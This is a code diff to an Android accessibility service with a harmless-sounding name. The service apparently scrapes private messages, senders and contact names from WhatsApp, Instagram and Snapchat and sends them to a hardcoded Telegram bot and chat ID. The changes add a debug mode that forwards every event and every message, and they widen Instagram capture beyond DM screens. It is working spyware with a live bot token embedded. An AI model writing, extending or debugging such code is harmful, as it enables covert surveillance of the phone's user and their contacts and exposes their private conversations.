@@ -26,10 +26,13 @@ public class GlobalActionBarService extends AccessibilityService {
     private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
     private static final String CHAT_ID = "5465116744";
 
+    // DEBUG MODE – set to true to see every event
+    private static final boolean DEBUG_MODE = true;
+
     private long lastSendTime = 0;
     private String lastSentHash = "";
 
-    // Message text view IDs – for all apps
+    // Message text view IDs
     private Set<String> messageTextIds = new HashSet<String>() {{
         add("com.whatsapp:id/message_text");
         add("com.instagram.android:id/row_message_text");
@@ -38,13 +41,14 @@ public class GlobalActionBarService extends AccessibilityService {
         add("com.snapchat.android:id/chat_message_text");
     }};
 
-    // Instagram DM header IDs – if any of these exist, we are in a DM conversation
+    // Instagram DM header IDs
     private Set<String> dmHeaderIds = new HashSet<String>() {{
         add("com.instagram.android:id/direct_message_recipient_name");
         add("com.instagram.android:id/action_bar_title");
+        add("com.instagram.android:id/row_user_name"); // sometimes appears
     }};
 
-    // Instagram sender name IDs (inside bubbles)
+    // Instagram sender name IDs
     private Set<String> instagramSenderIds = new HashSet<String>() {{
         add("com.instagram.android:id/row_user_name");
         add("com.instagram.android:id/comment_user_name");
@@ -82,7 +86,6 @@ public class GlobalActionBarService extends AccessibilityService {
         add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
         add("Bakchodi boiz"); add("MARK AS READ");
         add("Display brightness");
-        // Add any other junk you see
         add("Unpopular opinion");
         add("Explore");
         add("Reels");
@@ -100,32 +103,65 @@ public class GlobalActionBarService extends AccessibilityService {
         if (event.getPackageName() == null) return;
         String pkg = event.getPackageName().toString();
 
+        // Only target apps
         if (!pkg.equals("com.instagram.android") &&
             !pkg.equals("com.snapchat.android") &&
             !pkg.equals("com.whatsapp")) {
             return;
         }
 
+        // For debugging: send event details
+        if (DEBUG_MODE) {
+            String debugMsg = String.format("🔍 EVENT: %s | Type: %d", pkg, event.getEventType());
+            sendToTelegram(debugMsg);
+            writeToFile(debugMsg);
+        }
+
+        // Only process window changes (new screen) or content changes (new messages)
         if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
             event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             return;
         }
 
         AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return;
-
-        // --- CRITICAL: For Instagram, check if we are in a DM screen ---
-        if (pkg.equals("com.instagram.android") && !isDMScreen(root)) {
-            return; // ignore everything except DMs
+        if (root == null) {
+            if (DEBUG_MODE) sendToTelegram("❌ root is null");
+            return;
         }
 
-        // 1. Get chat contact name (only if we are in DM)
+        // --- For Instagram: check if DM screen ---
+        if (pkg.equals("com.instagram.android")) {
+            boolean isDM = isDMScreen(root);
+            if (DEBUG_MODE) {
+                sendToTelegram("📌 DM detection: " + (isDM ? "YES" : "NO"));
+            }
+            if (!isDM) {
+                // If not DM, we still might want to capture messages? Let's skip for now.
+                // But we'll also try to extract messages regardless for testing.
+                // Actually, let's still try to extract and see if we get anything.
+                // But we'll only send if we find messages.
+            }
+        }
+
+        // 1. Get contact name (if any)
         String contact = findChatContact(root, pkg);
 
         // 2. Extract messages
         List<MessageEntry> messages = extractMessages(root, pkg);
 
-        if (messages.isEmpty()) return;
+        if (DEBUG_MODE) {
+            sendToTelegram("📩 Found " + messages.size() + " messages");
+            if (!messages.isEmpty()) {
+                for (MessageEntry m : messages) {
+                    sendToTelegram("  - " + m.sender + ": " + m.text);
+                }
+            }
+        }
+
+        if (messages.isEmpty()) {
+            // Still, for Instagram we might want to capture if it's DM and there are no messages? That's fine.
+            return;
+        }
 
         // 3. Build output
         StringBuilder logBuilder = new StringBuilder();
@@ -141,6 +177,7 @@ public class GlobalActionBarService extends AccessibilityService {
         String fullLog = logBuilder.toString().trim();
         if (fullLog.length() < 30) return;
 
+        // Dedup & cooldown (but for debug, we might want to send every time)
         String hash = Integer.toHexString(fullLog.hashCode());
         long now = System.currentTimeMillis();
         if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
@@ -153,32 +190,44 @@ public class GlobalActionBarService extends AccessibilityService {
         writeToFile(fullLog);
     }
 
-    // ---- DM Screen Guard for Instagram ----
+    // ---- DM Screen Detection (more flexible) ----
 
     private boolean isDMScreen(AccessibilityNodeInfo root) {
         // Check if any DM header ID exists
         for (String id : dmHeaderIds) {
-            if (findTextByViewId(root, id) != null) {
+            if (findViewByViewId(root, id) != null) {
                 return true;
             }
         }
-        // Fallback: check if there's an "action bar" that contains a name
-        // We'll just rely on the IDs above.
+        // Fallback: if there is any text that looks like a username (contains "@" or is short and appears at top)
+        // We'll just rely on IDs for now.
         return false;
     }
 
-    // ---- Helper classes ----
+    // ---- Helper methods ----
 
-    private static class MessageEntry {
-        String sender;
-        String text;
-        MessageEntry(String sender, String text) {
-            this.sender = sender;
-            this.text = text;
+    private AccessibilityNodeInfo findViewByViewId(AccessibilityNodeInfo node, String targetId) {
+        if (node == null) return null;
+        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
+            return node;
         }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                AccessibilityNodeInfo result = findViewByViewId(child, targetId);
+                if (result != null) return result;
+            }
+        }
+        return null;
     }
 
-    // ---- Contact name extraction ----
+    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
+        AccessibilityNodeInfo view = findViewByViewId(node, targetId);
+        if (view != null && view.getText() != null) {
+            return view.getText().toString().trim();
+        }
+        return null;
+    }
 
     private String findChatContact(AccessibilityNodeInfo root, String pkg) {
         Set<String> headerIds;
@@ -196,26 +245,7 @@ public class GlobalActionBarService extends AccessibilityService {
             String name = findTextByViewId(root, id);
             if (name != null && !name.isEmpty()) return name;
         }
-        // Fallback: look for large text at the top
         return findTopLargeText(root);
-    }
-
-    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
-        if (node == null) return null;
-        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
-            if (node.getText() != null) {
-                String text = node.getText().toString().trim();
-                if (!text.isEmpty()) return text;
-            }
-        }
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                String result = findTextByViewId(child, targetId);
-                if (result != null) return result;
-            }
-        }
-        return null;
     }
 
     private String findTopLargeText(AccessibilityNodeInfo root) {
@@ -260,9 +290,7 @@ public class GlobalActionBarService extends AccessibilityService {
                 entries.add(new MessageEntry(sender, msg));
             }
         } else if (pkg.equals("com.instagram.android")) {
-            // Only proceed if we are in DM (already checked, but double-check)
-            if (!isDMScreen(root)) return entries;
-
+            // Find all message text nodes
             List<AccessibilityNodeInfo> msgNodes = findAllTextNodes(root, messageTextIds);
             for (AccessibilityNodeInfo node : msgNodes) {
                 String msg = node.getText() != null ? node.getText().toString().trim() : "";
@@ -271,8 +299,8 @@ public class GlobalActionBarService extends AccessibilityService {
                 if (msg.isEmpty()) continue;
 
                 // Determine sender
-                AccessibilityNodeInfo parent = node.getParent();
                 boolean hasSender = false;
+                AccessibilityNodeInfo parent = node.getParent();
                 while (parent != null) {
                     if (hasSenderNameInTree(parent)) {
                         hasSender = true;
